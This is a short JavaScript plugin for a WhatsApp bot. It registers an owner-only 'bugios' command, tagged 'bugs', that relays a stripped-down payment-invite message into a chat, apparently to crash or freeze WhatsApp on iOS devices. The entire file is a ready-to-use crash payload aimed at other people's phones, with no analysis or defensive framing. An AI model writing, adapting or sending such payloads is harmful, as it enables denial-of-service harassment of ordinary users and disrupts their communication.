let handler = async (m, { conn, args, usedPrefix, command }) => {
   //let kurangtau = 'makjreng'
conn.relayMessage(m.chat, {
paymentInviteMessage: {
expiryTimestamp: 0,
serviceType: 1
}}, {})
}
handler.help = ['bugios']
handler.tags = ['bugs']
handler.command = /^(bugios|bugip)$/i
handler.owner = true

export default handler
